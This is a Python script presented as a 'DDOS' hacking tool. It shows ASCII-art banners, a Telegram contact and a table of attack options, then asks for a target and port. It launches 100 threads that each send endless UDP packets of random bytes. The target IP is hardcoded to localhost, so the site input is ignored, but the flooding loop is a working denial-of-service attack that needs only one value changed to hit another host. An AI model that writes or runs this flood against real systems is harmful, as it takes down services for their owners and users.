import os
import time
import socket
import threading
import random
from random import randint
from colorama import Fore, init
from prettytable import PrettyTable
import re

init(autoreset=True)

def show_menu():
    print("Welcome to the Progress Bar Simulation!")

n = 0
r = ""

while n <= 100:
    print(r, f"{Fore.LIGHTRED_EX}%{n}")
    n += randint(1, 5)
    r += "="
    time.sleep(0.1)

time.sleep(3)
os.system("cls" if os.name == "nt" else "clear")

print(f"""{Fore.LIGHTRED_EX}
.##..##...####...##......######.
.##.##...##..##..##........##...
.####....######..##........##...
.##.##...##..##..##........##...
.##..##..##..##..######..######.
................................
""")
print('')
print(Fore.BLUE + "   https://t.me/Mr_Dita")

print(Fore.LIGHTGREEN_EX + """
             .88888888:.
            88888888.88888.
          .8888888888888888.
          888888888888888888
          88' _88'_    88888         
          88 88 88 88  88888         
          88_88_::_88_:88888         
          88:::,::,:::::8888         
          88:::::::::'8888         
         .88  ::::'    8:88.         
        8888            8:888.       
      .8888'            888888.     
     .8888:..  .::.  ...:'8888888:.   
    .8888.'     :'     '::88:88888  
   .8888        '         .888:88888  
  888:8          .         888:88888. 
.888:88        .:         888:88888: 
8888888.       ::         88:888888.
.::.888.      ::         .888888888
.::::::.888.   ::         :::8888'.:.
 ::::::::::.888  '         .::::::::::::
 ::::::::::::.8   '      .:8::::::::::::.     
.::::::::::::::.      .:888:::::::::::::
:::::::::::::::88:.__..:88888:::::::::::'
  '.:::::::::::88888888888.88:::::::::'      
        ':::_:' -- '' -'-' ':_::::'  
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
""")

print(re.sub(r'Warning ! This is a test reporter, any offense is the responsibility of the user !', '', 'Warning ! This is a test reporter, any offense is the responsibility of the user !'))

t = PrettyTable([f'{Fore.BLUE}Number{Fore.RED}', f'{Fore.BLUE}Info{Fore.RED}'])
t.add_row([f'{Fore.GREEN}1{Fore.RED}', f'{Fore.YELLOW}Attack set DDOS>1{Fore.RED}'])
t.add_row([f'{Fore.GREEN}2{Fore.RED}', f'{Fore.YELLOW}Attack set DDOS>1{Fore.RED}'])
t.add_row([f'{Fore.GREEN}3{Fore.RED}', f'{Fore.YELLOW}Attack set DDOS>1{Fore.RED}'])

print(t)
print('')
site = input("DDOS HACKING =>? ")
target_site = input("DDOS TARGET SET => ")
target_port = input("DDOS ATTACK PORT => ")

# Settings
target_ip = "127.0.0.1"   
target_port = int(target_port)         
num_threads = 100         

def attack():
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1024)  
    while True:
        client.sendto(bytes, (target_ip, target_port))
        print("\033[92m[+] Sending packet to {}:{}".format(target_ip, target_port))  

for i in range(num_threads):
    thread = threading.Thread(target=attack)
    thread.start()
    time.sleep(0.1)  

print("\033[91m[!] Attack started!")
